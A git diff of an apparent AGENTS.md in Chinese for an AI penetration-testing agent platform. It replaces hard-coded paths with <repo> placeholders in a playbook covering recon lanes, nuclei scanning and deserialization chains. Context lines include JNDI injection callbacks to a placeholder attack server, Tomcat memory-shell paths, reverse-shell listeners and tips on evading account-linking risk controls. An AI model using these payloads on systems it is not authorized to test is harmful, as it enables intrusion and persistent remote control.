@@ -22,7 +22,7 @@
 ### 开局序列（每个站点固定，写死不可跳步）
 
 1. **建台账**（工作区=当前会话目录，无需 --binding）：
-   `python3 /opt/chana/app/skills/pentest-sop/scripts/workflow.py init --workspace <工作区> --objective "<交付目标>" --scope http://<目标> --mode assessment`
+   `python3 <repo>/skills/pentest-sop/scripts/workflow.py init --workspace <工作区> --objective "<交付目标>" --scope http://<目标> --mode assessment`
 2. **D0 四车道多 Agent 并行（A/B/D 执行者 ≥2，记入台账 d0_lanes，check 硬校验；小目标豁免须 waiver_reason）**：
    - **车道A JS 逐文件分析**：采全部 JS+chunk → `build-js-manifest.py` → `analyze-js.cjs` → 人工读封装层 → 接口候选表
    - **车道B 路径三轮**：`collect-paths.py`（每前缀 ≥3 随机基线）→ `review-paths.py` 复核
@@ -52,26 +52,26 @@ D0/D1 只登记信号（R2 后允许 GET 单发探测：rememberMe 无效值对�
 
 过门后台账仍要持续更新（新请求/假设/任务/证据随时追加，不因过门冻结）；每完成一个模块 check 自检，不攒到最后。存量 facts 只当线索，覆盖必须本会话重建；同一阻塞 ≥3 次记 blocked 换向。
 
-判据：`/opt/chana/app/skills/pentest-sop/references/workflow-gates.md`；完整流程：`/opt/chana/app/skills/pentest-sop/references/site-pentest-playbook.md`（canonical）
+判据：`<repo>/skills/pentest-sop/references/workflow-gates.md`；完整流程：`<repo>/skills/pentest-sop/references/site-pentest-playbook.md`（canonical）
 <!-- CHANA-WORKFLOW-GOVERNANCE:END -->
 
 <!-- AGENT-PLAYBOOK:BEGIN 手工维护：agent 复盘沉淀索引，平台勿动（原 CHANA-PLAYBOOK-V2 已并入 canonical） -->
 ## 渗透作战手册索引
 
-> **全文（canonical）**：`/opt/chana/app/skills/pentest-sop/references/site-pentest-playbook.md`。本块只留索引与最易犯错的条目。
+> **全文（canonical）**：`<repo>/skills/pentest-sop/references/site-pentest-playbook.md`。本块只留索引与最易犯错的条目。
 
 - **硬门 vs 纪律**：两道门与 check 硬校验是机器拦的；完成度核对、会话保护、汇报节奏、D3 复核姿势是纪律，复盘追责。修改流程描述时如实标注属于哪层。
 - **D0 完成度核对表**：A chunk 全采+提取率 ≥60%+人工读封装层 / B 三轮+每前缀 ≥3 基线 / C captured 占可见功能点比（**C 为 0 或 blocked 不说明 → 不进 D1**）/ D 台账与 JS 可提取数对齐。
 - **会话保护（开工第一件事下发禁调清单）**：`/logout /exit /signout /loginOut /loginOff /casLogout Authserver/Logout` + 目标专属登出端点；换 ST 只换一次；每 5-10 请求复检 SSO Cookie；会话丢失＝先全局暂停→取证→定性→恢复。
 - **流量捕获与覆盖教训**（Twilio 13 轮实战，硬）：全文 `pentest-sop/references/traffic-capture-and-coverage-lessons.md`。最易犯错：①抓包优先 **Chrome CDP debugger**（MCP capture 只回 URL/状态码，拿不到 headers/body——输出只有 URL 就立即换）；②D1 至少覆盖 auth/sqli/idor/ssrf/logic/info 六桶，不能漏 sqli；③说"穷尽"前必须有**资产×攻击面覆盖矩阵**；④IDOR 必须用**真实对象标识**（Wayback CDX 等），随机 SID 只能证"不存在"；⑤同 IP 多账号会被风控关联，跨账号测试优先让用户提供 token；⑥写操作先规划清理，创建后 5 分钟内删除并验证。
-- **技能选择先查索引树**：141 个 skill 先读 `/opt/chana/app/skills/_TREE.md`（场景→该用哪个）。
+- **技能选择先查索引树**：141 个 skill 先读 `<repo>/skills/_TREE.md`（场景→该用哪个）。
 - **AGENTS.md 修改纪律**：改前 `.bak`；不动 `CHANA-*` 标记块归属；细节写进 skills 持久文件、本文件只留索引；新流程条目先标注硬/软再写。
 <!-- AGENT-PLAYBOOK:END -->
 
 <!-- CHANA-PENTEST-LIFECYCLE:BEGIN 平台维护：项目生命周期铁律（2026-11-13，watchdog v2 联动强制） -->
 ## 项目生命周期铁律（每个渗透项目）
 
-1. **台账先行**：工作区必须有 `coverage.md` 覆盖率台账（模板 `/opt/chana-bridge/template/coverage-template.md`，新项目用 `/opt/chana-bridge/new_project.sh` 一键铺）。没有台账=项目未开工；每轮结束回填结论；「测穿/无剩余目标」唯一判定=台账全部行有结论。watchdog 会按台账缺失/停滞点名。
+1. **台账先行**：工作区必须有覆盖率台账（用 `<repo>/skills/pentest-sop/scripts/workflow.py init --workspace <工作区> ...` 初始化，`workflow.py coverage` 生成/校验统计）。没有台账=项目未开工；每轮结束回填结论；「测穿/无剩余目标」唯一判定=台账全部行有结论。watchdog 会按台账缺失/停滞点名。
 2. **后台 job 登记制**：启动任何后台任务（nohup/run_in_background/worker）当轮 append 到 `jobs.jsonl`（字段 `{"ts","name","outputFile","status":"running"}`），收口改 `done`。watchdog job 哨兵按产物停滞点名收口——后台跑完没人接=违规。
 3. **反登录框沉迷**：同一站点认证链路累计 ≤3 轮无凭据/接管闭环 → 记阻塞换面；前端密码学逆向 ≤1 轮且必须有利用出口；新站点先非认证面（未授权接口/IDOR/导出）后认证面。
 4. **接口全测**：每个存活服务先接口提取（JS→API 清单→功能点遍历，产物 `recon/<host>-api.md`），再逐接口鉴权矩阵（未授权/IDOR/注入/导出优先），结论回填台账。指纹/端口/存活 ≠ 测过。
@@ -106,7 +106,7 @@ D0/D1 只登记信号（R2 后允许 GET 单发探测：rememberMe 无效值对�
 ## 渗透打法（精华，接目标即用）
 
 <!-- CHANA-ATTACK-THINKING:BEGIN 平台维护：攻击思维协议（2026-11-13） -->
-### 攻击思维四协议（管"怎么想"，完整版 /opt/chana/app/skills/attack-thinking/SKILL.md）
+### 攻击思维四协议（管"怎么想"，完整版 <repo>/skills/attack-thinking/SKILL.md）
 
 1. **世界模型三问（新资产开打前必答，写进台账）**：①这系统替谁管什么（数据/钱/权限）？②信任边界在哪（画出谁→谁，跨系统交界最高产）？③开发最可能怎么偷懒（前端校验/导出忘鉴权/测试路由进生产）？产出 ≥3 条具体假设（"X很可能Y因为Z"），无假设不打弹；打不中改假设，不是改编码。
 2. **卡壳协议（同一动作 3 次失败强制触发，禁止第 4 次同思路重试）**：写出四问——我在隐含假设什么？假设错了现象为何还在？相邻面还有什么？换维度五选一（换对象/层级/入口/时间窗/协议）。**换思路不是换 payload 编码。** 死磕=同一假设下反复换编码。
@@ -123,7 +123,7 @@ D0/D1 只登记信号（R2 后允许 GET 单发探测：rememberMe 无效值对�
 
 ### JS 分析与路径发现（必做闭环，不能只 grep 首页或跑一轮字典）
 
-开始站点发现时**先读** `/opt/chana/app/skills/pentest-sop/references/js-path-discovery.md`，按其中采集→分析→校准→验证→落库步骤执行。核心铁律：
+开始站点发现时**先读** `<repo>/skills/pentest-sop/references/js-path-discovery.md`，按其中采集→分析→校准→验证→落库步骤执行。核心铁律：
 
 - 先看业务再扫（浏览器遍历功能；SPA 跟懒加载 chunk）；逐文件保存来源/角色/哈希，**禁止合并成 all_js.js**；读调用链（页面→业务函数→请求封装→baseURL→接口），未知值不猜。
 - 离线工具链：`build-js-manifest.py` → `analyze-js.cjs`（Acorn 只解唯一绑定 const，压缩产物召回低须人工补读）→ `collect-paths.py`（每前缀 ≥3 随机基线）→ `review-paths.py`。**dirsearch 原生 JSON 无正文不能直接喂复核器**。
@@ -133,7 +133,7 @@ D0/D1 只登记信号（R2 后允许 GET 单发探测：rememberMe 无效值对�
 
 - 产品/CVE 命中 → `cat <repo>/ammo/kb/srcwiki_poc/{中间件漏洞|应用服务器漏洞|开发框架漏洞|CVE-2026}/_index.md` 取完整请求包直打（A/B 级可直接打）
 - nuclei 模板 12.4w 张：`grep -rl "产品名" <仓库>/ammo/nuclei-templates --include="*.yaml" | head -30 | xargs nuclei -u http://目标 -severity high,critical -timeout 5`（12w 全量 -t 编译慢，别整库）
-- 同类系统实战骨架：`cat /opt/chana/app/skills/skeleton-arsenal/_index.md`（JeecgBoot/若依/正方/金智/OA 等，骨架「坑」段必读）
+- 同类系统实战骨架：`cat <repo>/skills/skeleton-arsenal/_index.md`（JeecgBoot/若依/正方/金智/OA 等，骨架「坑」段必读）
 - 秒杀卡（每卡 ≤50 行）：`ls <repo>/ammo/kb/quick-ref/`（active-probe / midware-rce / sqli / fingerprint-nday 等）
 
 ### Java 组件主动探测（先找信号，再登记深入验证）
@@ -152,7 +152,7 @@ Shiro 0 命中 → 立即换下一链路不死磕；链被黑名单拦（Shiro�
 
 - 反序列化链生成（Shiro 有 key 无链 / Hessian / XStream / 原生 / Fastjson 深度利用）：`python3 <repo>/ammo/tools/javachain/jchain.py native|shiro|hessian|xstream|fastjson ...`
 - 攻击基础设施 **<your-attack-server>**：JNDI 打点 `ldap://<your-attack-server>:1389/Basic/Command/Base64/<cmd>`（高版本 JDK 用 `/TomcatBypass/`，内存马 `/Basic/TomcatMemshell1`）；HTTP 回连取证 `:8811`；反弹 shell 监听（SSH 到攻击服务器执行 `srv.py listen`）
-- FOFA：key 在 `/opt/chana/app/config.yaml` fofa 段，python 直调 `https://fofa.info/api/v1/search/all`
+- FOFA：key 在 `<repo>/config.yaml` fofa 段，python 直调 `https://fofa.info/api/v1/search/all`
 - 全局命令：nmap / sqlmap（仅读不写）/ nuclei / dirsearch / wafw00f；出网直连无代理；**Windows 目标命令用 Windows 语法（无 id/cat）**
 
 ### 影响层级（L1-L5，标注成果强度，不是统一终局）
@@ -184,7 +184,7 @@ CORS 宽松（无凭证无敏感数据）/ 缺安全响应头 / Cookie 缺 Secur
 
 ### 收口
 
-作业结束生成七段报告（概览/L1-L5/漏洞清单/详情/资产/攻击路径/副作用申报）：`cd /opt/chana/app && python3 tools/pentest_report.py --latest`
+作业结束生成七段报告（概览/L1-L5/漏洞清单/详情/资产/攻击路径/副作用申报）：`cd <repo> && python3 tools/pentest_report.py --latest`
 
 ## 平台作业面：`mcp__chana__*`（44 个工具）
 
@@ -230,7 +230,7 @@ CORS 宽松（无凭证无敏感数据）/ 缺安全响应头 / Cookie 缺 Secur
 
 - **禁止单条 `sleep` > 120s** 做等待/轮询；要等就交给 supervisor，或分多次短 sleep。
 - 每个 `subagent` 启动后立刻把 `childId`（或 label）登记到台账/fact，注明职责与预期产出路径。
-- 收口前必须 `list_agents(scope="children")` 逐个核对状态，并跑 `python3 /opt/chana/app/tools/agent_watch.py --workspace <工作区> <childId...>`：`running` = 未完成，`interrupted`/`empty` = 没跑成，`completed` 才算数。
+- 收口前必须 `list_agents(scope="children")` 逐个核对状态，并跑 `python3 <repo>/tools/agent_watch.py --workspace <工作区> <childId...>`：`running` = 未完成，`interrupted`/`empty` = 没跑成，`completed` 才算数。
 - **声明「持续监控中」前，必须已经拿到 supervisor 的返回**；没有就是假进度，违反第 3 条汇报语气约束。
 - 轮次被 `interrupted` 后恢复，第一动作是核对上一轮全部 childId 状态（含仍在写的 running 会话），再决定继续等、`send_message` 唤醒，还是重新派活——不许直接开新一批把旧的一丢。
 - `agent_watch.py` 直接读 DSH 落盘会话判断 `completed/running/interrupted/empty`，不依赖内存态，是「有没有真的跑完」的最终判据。
@@ -318,7 +318,7 @@ CORS 宽松（无凭证无敏感数据）/ 缺安全响应头 / Cookie 缺 Secur
 
 ## 请求证据交接
 
-已有 HAR、Burp 原始请求或业务抓包时，先读 `/opt/chana/app/skills/request-triage/SKILL.md`，按真实方法、字段、账号角色与出处建立请求清单（格式见同目录 references/request-evidence.md）。`supported` 仅表示假设获证据支持，必须独立核实完整链路、可复现影响和原始响应后才记录确认结果；离线助手不访问网络、不自动重放。
+已有 HAR、Burp 原始请求或业务抓包时，先读 `<repo>/skills/request-triage/SKILL.md`，按真实方法、字段、账号角色与出处建立请求清单（格式见同目录 references/request-evidence.md）。`supported` 仅表示假设获证据支持，必须独立核实完整链路、可复现影响和原始响应后才记录确认结果；离线助手不访问网络、不自动重放。
 
 <!-- VPS-BROWSER-CONTROL:BEGIN -->
 # VPS Chrome 与 MCP Chrome Extension
